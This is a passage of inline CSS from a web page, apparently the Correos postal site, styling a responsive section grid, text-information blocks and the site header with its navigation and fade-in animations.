		.sc-correos-cdk-section-automatic-responsive-h[variant="2-4-6"][size=lg] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			width: calc(100% - 160px);
			grid-template-columns: 16.66% 16.66% 16.66% 16.66% 16.66% 16.66%
		}

		.sc-correos-cdk-section-automatic-responsive-h[display=p-start] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			-ms-flex-align: start;
			align-items: flex-start
		}

		.sc-correos-cdk-section-automatic-responsive-h[display=p-end] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			-ms-flex-align: end;
			align-items: flex-end
		}

		.sc-correos-cdk-section-automatic-responsive-h[display=p-center] .sc-correos-cdk-section-automatic-responsive-s>[slot=components] {
			-ms-flex-align: center;
			align-items: center
		}
	</style>
	<style>
		.sc-correos-ui-text-inf-h {
			--_ui-text-inf-color-title: var(--ui-text-inf-color-title, red);
			--_ui-text-inf-border-title: 1px solid var(--ui-text-inf-border-color-title, blue);
			--_ui-text-inf-color-text: 1px solid var(--ui-text-inf-color-text, magenta);
			--_ui-text-inf-link-color: var(--ui-text-inf-link-color, blue);
			--_ui-text-inf-border-title-lab: 1px solid var(--ui-text-inf-border-color-title-lab, blue)
		}

		.sc-correos-ui-text-inf-h {
			display: block
		}

		.sc-correos-ui-text-inf-h .ui-footer.sc-correos-ui-text-inf {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-wrap: wrap;
			flex-wrap: wrap
		}

		.sc-correos-ui-text-inf-h .sc-correos-ui-text-inf-s>[slot=title] {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			border-bottom: var(--_ui-text-inf-border-title);
			font-weight: 300;
			margin-bottom: 15px;
			padding-bottom: 16px;
			font-size: 2rem
		}

		.sc-correos-ui-text-inf-h .sc-correos-ui-text-inf-s>[slot=text] {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			font-size: 1rem;
			line-height: 1.5rem;
			color: var(--_ui-text-inf-color-text);
			font-weight: 300;
			margin-bottom: 16px
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-text-inf-h .sc-correos-ui-text-inf-s>[slot=text] {
				font-size: 1.125rem;
				line-height: 1.875rem
			}
		}

		.sc-correos-ui-text-inf-h .sc-correos-ui-text-inf-s>[slot=linkright],
		.sc-correos-ui-text-inf-h .sc-correos-ui-text-inf-s>[slot=linkleft],
		.sc-correos-ui-text-inf-h .sc-correos-ui-text-inf-s>[slot=linkextra] {
			margin-right: 16px
		}

		.sc-correos-ui-text-inf-h .sc-correos-ui-text-inf-s>[slot=linkright] .ui-img,
		.sc-correos-ui-text-inf-h .sc-correos-ui-text-inf-s>[slot=linkleft] .ui-img,
		.sc-correos-ui-text-inf-h .sc-correos-ui-text-inf-s>[slot=linkextra] .ui-img {
			height: 48px;
			width: 152px
		}

		.sc-correos-ui-text-inf-h .sc-correos-ui-text-inf-s>[slot=linkextra]:empty {
			display: none
		}

		[size=sm].sc-correos-ui-text-inf-h .ui-footer.sc-correos-ui-text-inf,
		[size=md].sc-correos-ui-text-inf-h .ui-footer.sc-correos-ui-text-inf,
		[size=lg].sc-correos-ui-text-inf-h .ui-footer.sc-correos-ui-text-inf {
			-ms-flex-direction: row;
			flex-direction: row
		}

		.sc-correos-ui-text-inf-h[size=sm] .sc-correos-ui-text-inf-s>[slot=linkright],
		.sc-correos-ui-text-inf-h[size=md] .sc-correos-ui-text-inf-s>[slot=linkright],
		.sc-correos-ui-text-inf-h[size=lg] .sc-correos-ui-text-inf-s>[slot=linkright] {
			margin-top: 0
		}

		.sc-correos-ui-text-inf-h[size=lg] .sc-correos-ui-text-inf-s>[slot=linkleft],
		.sc-correos-ui-text-inf-h[size=lg] .sc-correos-ui-text-inf-s>[slot=linkright],
		.sc-correos-ui-text-inf-h[size=lg] .sc-correos-ui-text-inf-s>[slot=linkextra] {
			margin-right: 24px
		}

		.sc-correos-ui-text-inf-h[size=lg] .sc-correos-ui-text-inf-s>[slot=linkright] .ui-img,
		.sc-correos-ui-text-inf-h[size=lg] .sc-correos-ui-text-inf-s>[slot=linkleft] .ui-img,
		.sc-correos-ui-text-inf-h[size=lg] .sc-correos-ui-text-inf-s>[slot=linkextra] .ui-img {
			height: 56px;
			width: 192px
		}

		[variant=download].sc-correos-ui-text-inf-h .ui-link.sc-correos-ui-text-inf {
			margin-bottom: 16px
		}

		@media (min-width: 1024px) {
			[variant=download].sc-correos-ui-text-inf-h .ui-link.sc-correos-ui-text-inf {
				margin-bottom: 16px
			}
		}

		.sc-correos-ui-text-inf-h[variant=download] .sc-correos-ui-text-inf-s>[slot=title] {
			font-size: 1.5rem;
			line-height: 2.25rem;
			border-bottom: none;
			margin-bottom: 0;
			padding-bottom: 8px;
			line-height: 2.25rem;
			font-weight: normal
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-text-inf-h[variant=download] .sc-correos-ui-text-inf-s>[slot=title] {
				font-size: 2rem;
				line-height: 2.75rem
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-text-inf-h[variant=download] .sc-correos-ui-text-inf-s>[slot=title] {
				line-height: 3rem
			}
		}

		.sc-correos-ui-text-inf-h[variant=download] .sc-correos-ui-text-inf-s>[slot=text] {
			font-size: 0.875rem;
			line-height: 1.375rem
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-text-inf-h[variant=download] .sc-correos-ui-text-inf-s>[slot=text] {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		.sc-correos-ui-text-inf-h[variant=basic] .sc-correos-ui-text-inf-s>[slot=title] {
			font-size: 1.5rem;
			line-height: 2.25rem;
			border-bottom: none;
			margin-bottom: 8px;
			padding-bottom: 0;
			font-weight: normal
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-text-inf-h[variant=basic] .sc-correos-ui-text-inf-s>[slot=title] {
				font-size: 2rem;
				line-height: 2.75rem
			}
		}

		.sc-correos-ui-text-inf-h[variant=basic] .sc-correos-ui-text-inf-s>[slot=text] {
			font-size: 1rem;
			line-height: 1.5rem
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-text-inf-h[variant=basic] .sc-correos-ui-text-inf-s>[slot=text] {
				font-size: 1.125rem;
				line-height: 1.875rem
			}
		}

		.sc-correos-ui-text-inf-h[variant=basic-reduced] .sc-correos-ui-text-inf-s>[slot=title] {
			font-size: 1.125rem;
			line-height: 1.625rem;
			border-bottom: none;
			margin-bottom: 8px;
			padding-bottom: 0;
			font-weight: normal
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-text-inf-h[variant=basic-reduced] .sc-correos-ui-text-inf-s>[slot=title] {
				font-size: 1.5rem;
				line-height: 2.25rem
			}
		}

		.sc-correos-ui-text-inf-h[variant=basic-reduced] .sc-correos-ui-text-inf-s>[slot=text] {
			font-size: 1rem;
			line-height: 1.5rem
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-text-inf-h[variant=basic-reduced] .sc-correos-ui-text-inf-s>[slot=text] {
				font-size: 1.125rem;
				line-height: 1.875rem
			}
		}

		[variant=features].sc-correos-ui-text-inf-h .ui-features.sc-correos-ui-text-inf {
			list-style: none;
			padding: 0
		}

		[variant=features].sc-correos-ui-text-inf-h .ui-item.sc-correos-ui-text-inf {
			margin: 24px 0
		}

		[variant=features].sc-correos-ui-text-inf-h .ui-item__title.sc-correos-ui-text-inf {
			font-size: 1.125rem;
			line-height: 1.625rem;
			color: var(--_ui-text-inf-color-title);
			text-decoration: none;
			margin-bottom: 8px;
			margin-top: 0
		}

		@media (min-width: 1024px) {
			[variant=features].sc-correos-ui-text-inf-h .ui-item__title.sc-correos-ui-text-inf {
				font-size: 1.5rem;
				line-height: 2.25rem
			}
		}

		[variant=features].sc-correos-ui-text-inf-h .ui-item__title--link.sc-correos-ui-text-inf {
			text-decoration: underline;
			color: var(--_ui-text-inf-link-color)
		}

		[variant=features].sc-correos-ui-text-inf-h .ui-item__description.sc-correos-ui-text-inf {
			font-size: 1rem;
			line-height: 1.5rem;
			font-weight: lighter;
			margin: 0
		}

		@media (min-width: 1024px) {
			[variant=features].sc-correos-ui-text-inf-h .ui-item__description.sc-correos-ui-text-inf {
				font-size: 1.125rem;
				line-height: 1.875rem
			}
		}

		.sc-correos-ui-text-inf-h[variant=download-links] .sc-correos-ui-text-inf-s>[slot=title] {
			border-bottom: none;
			font-size: 1.5rem;
			line-height: 2.25rem;
			padding-bottom: 0;
			margin-bottom: 24px
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-text-inf-h[variant=download-links] .sc-correos-ui-text-inf-s>[slot=title] {
				font-size: 2rem;
				line-height: 2.75rem
			}
		}

		.sc-correos-ui-text-inf-h[variant=download-links] .sc-correos-ui-text-inf-s>[slot=text] {
			font-size: 1rem
		}

		[variant=download-links].sc-correos-ui-text-inf-h .ui-downloads.sc-correos-ui-text-inf {
			list-style: none;
			padding: 0
		}

		.sc-correos-ui-text-inf-h[variant=minimal] .sc-correos-ui-text-inf-s>[slot=title] {
			font-size: 1.5rem;
			line-height: 2.25rem;
			border-bottom: none;
			margin-bottom: 8px;
			padding-bottom: 0;
			font-weight: normal
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-text-inf-h[variant=minimal] .sc-correos-ui-text-inf-s>[slot=title] {
				font-size: 2rem;
				line-height: 2.75rem
			}
		}

		.sc-correos-ui-text-inf-h[variant=minimal] .sc-correos-ui-text-inf-s>[slot=text] {
			font-size: 0.875rem;
			line-height: 1.375rem
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-text-inf-h[variant=minimal] .sc-correos-ui-text-inf-s>[slot=text] {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		.sc-correos-ui-text-inf-h[variant=notifications] .sc-correos-ui-text-inf-s>[slot=title] {
			border-bottom: none;
			font-size: 1.5rem;
			padding-bottom: 0;
			margin-bottom: 12px
		}

		.sc-correos-ui-text-inf-h[variant=notifications] .sc-correos-ui-text-inf-s>[slot=text] {
			font-size: 1rem;
			margin-bottom: 24px
		}

		[variant=pop-up-spa].sc-correos-ui-text-inf-h .ui-footer.sc-correos-ui-text-inf {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-wrap: nowrap;
			flex-wrap: nowrap
		}

		@media (max-width: 639px) {
			[variant=pop-up-spa].sc-correos-ui-text-inf-h .ui-footer.sc-correos-ui-text-inf {
				-ms-flex-wrap: wrap;
				flex-wrap: wrap
			}
		}
	</style>
	<style>
		.sc-correos-cdk-core-header-h {
			--_cdk-core-header-border-icon: 1px solid var(--cdk-core-header-border-icon, pink);
			--_cdk-core-header-border-subpanel: 1px solid var(--cdk-core-header-subpanel-border-color, violet);
			--_cdk-core-header-subpanel-text-subpanel: var(--cdk-core-header-subpanel-text-color, green);
			--_cdk-core-header-bg-color: var(--cdk-core-header-bg-color, teal);
			--_cdk-core-header-panel-bg-primary: var(--cdk-core-header-panel-bg-color-primary, blue);
			--_cdk-core-header-panel-bg-secondary: var(--cdk-core-header-panel-bg-color-secondary, purple);
			--_cdk-core-header-subpanel-bg: var(--cdk-core-header-subpanel-bg-color, red);
			--_cdk-core-header-text-color: var(--cdk-core-header-text-color, teal);
			--_cdk-core-header-panel-text-color-primary: var(--cdk-core-header-panel-text-color-primary, yellow);
			--_cdk-core-header-panel-text-color-secondary: var(--cdk-core-header-panel-text-color-secondary, green);
			--_cdk-core-header-shadow: var(--cdk-core-header-shadow, 0 5px 20px 0 rgba(0, 0, 0, 0.1));
			--_cdk-core-header-wrapper-main: var(--cdk-core-header-wrapper-main, 2rem);
			--_cdk-core-header-wrapper-gutters: var(--cdk-core-header-wrapper-gutters, 80px);
			--_cdk-core-header-color-bar-top: var(--cdk-core-header-color-bar-top, orange);
			--_cdk-core-header-color-logo: var(--cdk-core-color-logo, purple);
			--_cdk-core-header-color-links: var(--cdk-core-header-color-links, purple);
			--_cdk-core-header-item-title: var(--cdk-core-header-item-title, #002E6D)
		}

		@-webkit-keyframes fade-in-particular-item {
			from {
				opacity: 0;
				-webkit-transform: translateX(12px);
				transform: translateX(12px)
			}

			to {
				opacity: 1;
				-webkit-transform: translateX(0px);
				transform: translateX(0px)
			}
		}

		@keyframes fade-in-particular-item {
			from {
				opacity: 0;
				-webkit-transform: translateX(12px);
				transform: translateX(12px)
			}

			to {
				opacity: 1;
				-webkit-transform: translateX(0px);
				transform: translateX(0px)
			}
		}

		@-webkit-keyframes fade-in-empresa-item {
			from {
				opacity: 0;
				-webkit-transform: translateX(12px);
				transform: translateX(12px)
			}

			to {
				opacity: 1;
				-webkit-transform: translateX(0px);
				transform: translateX(0px)
			}
		}

		@keyframes fade-in-empresa-item {
			from {
				opacity: 0;
				-webkit-transform: translateX(12px);
				transform: translateX(12px)
			}

			to {
				opacity: 1;
				-webkit-transform: translateX(0px);
				transform: translateX(0px)
			}
		}

		p.sc-correos-cdk-core-header {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal
		}

		ol.sc-correos-cdk-core-header {
			margin: 0;
			padding: 0;
			list-style: none
		}

		button.sc-correos-cdk-core-header {
			border: unset;
			cursor: pointer;
			margin: 0;
			padding: 0;
			width: unset;
			overflow: unset;
			background: unset;
			text-align: flex-start;
			color: inherit;
			font: inherit;
			line-height: inherit;
			-webkit-font-smoothing: inherit;
			-moz-osx-font-smoothing: inherit;
			-webkit-appearance: none;
			outline: none
		}

		button.sc-correos-cdk-core-header::-moz-focus-inner {
			border: 0;
			padding: 0
		}

		button.sc-correos-cdk-core-header:focus {
			-webkit-box-shadow: inset 0 0 0 2px rgba(128, 128, 128, 0.5);
			box-shadow: inset 0 0 0 2px rgba(128, 128, 128, 0.5)
		}

		a.sc-correos-cdk-core-header {
			outline: none;
			text-decoration: none;
			color: inherit
		}

		a.sc-correos-cdk-core-header:hover,
		a.sc-correos-cdk-core-header:visited,
		a.sc-correos-cdk-core-header:active {
			color: inherit
		}

		a.sc-correos-cdk-core-header:focus {
			-webkit-box-shadow: inset 0 0 0 2px rgba(128, 128, 128, 0.5);
			box-shadow: inset 0 0 0 2px rgba(128, 128, 128, 0.5)
		}

		.sc-correos-cdk-core-header-h {
			display: block;
			--_height: var(--cdk-core-header-height, 56px);
			--_height-large: var(--cdk-core-header-height-large, 88px);
			--_height-band: var(--cdk-core-header-height-band, 118px);
			--_height-portalname: var(--cdk-core-header-height-portalname, 120px)
		}

		.--fixed.sc-correos-cdk-core-header-h .cdk-header.sc-correos-cdk-core-header {
			position: fixed !important
		}

		.--fixed.sc-correos-cdk-core-header-h .cdk-nav.sc-correos-cdk-core-header {
			position: fixed !important
		}

		.--particular.sc-correos-cdk-core-header-h .cdk-nav-switch-option.sc-correos-cdk-core-header>label.sc-correos-cdk-core-header::after,
		.--links.sc-correos-cdk-core-header-h .cdk-nav-switch-option.sc-correos-cdk-core-header>label.sc-correos-cdk-core-header::after {
			background-color: var(--_cdk-core-header-panel-text-color-primary)
		}

		.--particular.sc-correos-cdk-core-header-h .cdk-nav-page.--lv-first.sc-correos-cdk-core-header,
		.--links.sc-correos-cdk-core-header-h .cdk-nav-page.--lv-first.sc-correos-cdk-core-header {
			color: var(--_cdk-core-header-panel-text-color-primary);
			background-color: var(--_cdk-core-header-panel-bg-primary)
		}

		.--particular.sc-correos-cdk-core-header-h .cdk-nav-content.sc-correos-cdk-core-header::before,
		.--links.sc-correos-cdk-core-header-h .cdk-nav-content.sc-correos-cdk-core-header::before {
			background-color: var(--_cdk-core-header-panel-bg-primary)
		}

		.--particular.sc-correos-cdk-core-header-h .cdk-nav-lv-first-item.--particular-animation.sc-correos-cdk-core-header,
		.--links.sc-correos-cdk-core-header-h .cdk-nav-lv-first-item.--particular-animation.sc-correos-cdk-core-header {
			opacity: 0;
			-webkit-transform: translateX(12px);
			transform: translateX(12px);
			-webkit-animation: fade-in-particular-item 0.5s cubic-bezier(0.5, 0, 0.15, 1) forwards;
			animation: fade-in-particular-item 0.5s cubic-bezier(0.5, 0, 0.15, 1) forwards
		}

		.--empresa.sc-correos-cdk-core-header-h .cdk-nav-switch-option.sc-correos-cdk-core-header>label.sc-correos-cdk-core-header::after {
			background-color: var(--_cdk-core-header-panel-text-color-secondary)
		}

		.--empresa.sc-correos-cdk-core-header-h .cdk-nav-page.--lv-first.sc-correos-cdk-core-header {
			color: var(--_cdk-core-header-panel-text-color-secondary);
			background-color: var(--_cdk-core-header-panel-bg-secondary)
		}

		.--empresa.sc-correos-cdk-core-header-h .cdk-nav-content.sc-correos-cdk-core-header::before {
			background-color: var(--_cdk-core-header-panel-bg-secondary)
		}

		.--empresa.sc-correos-cdk-core-header-h .cdk-nav-lv-first-item.--empresa-animation.sc-correos-cdk-core-header {
			opacity: 0;
			-webkit-transform: translateX(12px);
			transform: translateX(12px);
			-webkit-animation: fade-in-empresa-item 0.5s cubic-bezier(0.5, 0, 0.15, 1) forwards;
			animation: fade-in-empresa-item 0.5s cubic-bezier(0.5, 0, 0.15, 1) forwards
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header {
			height: var(--_height)
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header {
				height: var(--_height-large)
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header-band.sc-correos-cdk-core-header {
			position: fixed;
			z-index: 16;
			background-color: var(--_cdk-core-header-color-bar-top);
			height: 32px;
			width: 100%
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header-band.sc-correos-cdk-core-header .onlySelect.sc-correos-cdk-core-header {
			-ms-flex-pack: end !important;
			justify-content: flex-end !important
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header-band_content.sc-correos-cdk-core-header {
			display: -ms-flexbox;
			display: flex;
			height: 100%;
			-ms-flex-align: center;
			align-items: center;
			-ms-flex-pack: justify;
			justify-content: space-between;
			padding-top: 8px
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header-band_content-title.sc-correos-cdk-core-header {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			font-size: 0.875rem;
			line-height: 1.375rem;
			font-weight: bold;
			color: var(--_cdk-core-header-item-title)
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header-band_content-title.sc-correos-cdk-core-header {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header-band_content-select.sc-correos-cdk-core-header {
			float: right;
			width: auto
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header-band_content-select.sc-correos-cdk-core-header {
				width: 180px
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header {
			height: var(--_height);
			width: 100%;
			background-color: var(--_cdk-core-header-bg-color);
			-webkit-box-shadow: var(--_cdk-core-header-shadow);
			box-shadow: var(--_cdk-core-header-shadow);
			position: absolute;
			z-index: 16;
			left: 0;
			right: 0;
			top: 0
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header::before {
			content: "";
			position: fixed;
			height: 8px;
			width: 100%;
			z-index: 1;
			background-color: var(--_cdk-core-header-color-bar-top)
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header {
				height: var(--_height-large)
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-align: center;
			align-items: center;
			-ms-flex-pack: justify;
			justify-content: space-between;
			padding-left: var(--_cdk-core-header-wrapper-gutters);
			padding-right: var(--_cdk-core-header-wrapper-gutters);
			-webkit-box-sizing: border-box;
			box-sizing: border-box;
			width: 100%;
			height: 100%;
			margin-top: 4px
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header {
			display: -ms-flexbox;
			display: flex;
			height: 100%
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-nav-button.sc-correos-cdk-core-header {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-align: center;
			align-items: center;
			-ms-flex-pack: center;
			justify-content: center;
			font-weight: 300;
			color: var(--_cdk-core-header-text-color);
			padding-left: 20px
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-nav-button.sc-correos-cdk-core-header:focus {
			-webkit-box-shadow: none;
			box-shadow: none
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-nav-button.sc-correos-cdk-core-header {
				padding-left: 32px
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-nav-button.sc-correos-cdk-core-header>span.sc-correos-cdk-core-header {
			font-size: 1rem;
			line-height: 1.5rem;
			margin-right: 0.5rem
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-nav-button.sc-correos-cdk-core-header>span.sc-correos-cdk-core-header {
				font-size: 1.125rem;
				line-height: 1.875rem
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-nav-button.sc-correos-cdk-core-header>i.sc-correos-cdk-core-header {
			-webkit-transition: -webkit-transform 0.3s cubic-bezier(0.165, 0.84, 0.44, 1);
			transition: -webkit-transform 0.3s cubic-bezier(0.165, 0.84, 0.44, 1);
			transition: transform 0.3s cubic-bezier(0.165, 0.84, 0.44, 1);
			transition: transform 0.3s cubic-bezier(0.165, 0.84, 0.44, 1), -webkit-transform 0.3s cubic-bezier(0.165, 0.84, 0.44, 1)
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-nav-button.--arrow-down.sc-correos-cdk-core-header>i.sc-correos-cdk-core-header {
			-webkit-transform: rotate(90deg);
			transform: rotate(90deg)
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-menu.sc-correos-cdk-core-header {
			display: -ms-flexbox;
			display: flex;
			margin-left: 40px;
			-ms-flex-item-align: center;
			align-self: center
		}

		@media (max-width: 639px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-menu.sc-correos-cdk-core-header {
				display: none
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-menu.sc-correos-cdk-core-header .cdk-header-menu-option.sc-correos-cdk-core-header {
			position: relative;
			text-align: center;
			-ms-flex-pack: center;
			justify-content: center;
			margin-right: 1.5rem;
			height: 2.5rem;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-align: center;
			align-items: center;
			cursor: pointer;
			-webkit-transition: background-color 0.15s linear;
			transition: background-color 0.15s linear;
			outline: none;
			color: var(--_cdk-core-header-panel-bg-secondary);
			min-width: 84px
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-menu.sc-correos-cdk-core-header .cdk-header-menu-option.--active.sc-correos-cdk-core-header {
			position: relative;
			font-weight: bold
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-menu.sc-correos-cdk-core-header .cdk-header-menu-option.--active.sc-correos-cdk-core-header::after {
			content: "";
			display: block;
			width: 100%;
			opacity: 1;
			will-change: opacity, width;
			-webkit-transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1);
			transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1);
			height: 1px;
			position: absolute;
			bottom: 0;
			background-color: var(--_cdk-core-header-panel-bg-secondary)
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-menu.sc-correos-cdk-core-header .cdk-header-menu-option.sc-correos-cdk-core-header:last-child {
			margin-right: 0
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-align: center;
			align-items: center;
			color: var(--_cdk-core-header-text-color)
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.sc-correos-cdk-core-header {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-align: center;
			align-items: center;
			height: 100%;
			padding: 0.25rem 0.7rem;
			display: flex;
			border-right: var(--_cdk-core-header-border-icon);
			font-size: 0.875rem;
			line-height: 1.375rem
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.sc-correos-cdk-core-header {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.sc-correos-cdk-core-header {
				padding: 0.5rem 1rem;
				height: 50px
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.sc-correos-cdk-core-header:last-child {
			border-right: none
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.sc-correos-cdk-core-header>a.sc-correos-cdk-core-header {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-pack: center;
			justify-content: center;
			-ms-flex-align: center;
			align-items: center
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.sc-correos-cdk-core-header>a.sc-correos-cdk-core-header>span.sc-correos-cdk-core-header {
			margin-left: 1rem;
			display: none
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.sc-correos-cdk-core-header>a.sc-correos-cdk-core-header>span.sc-correos-cdk-core-header {
				display: block
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.sc-correos-cdk-core-header>a.sc-correos-cdk-core-header>span.sc-correos-cdk-core-header:hover {
			text-decoration: underline
		}

		@media (min-width: 1024px) {
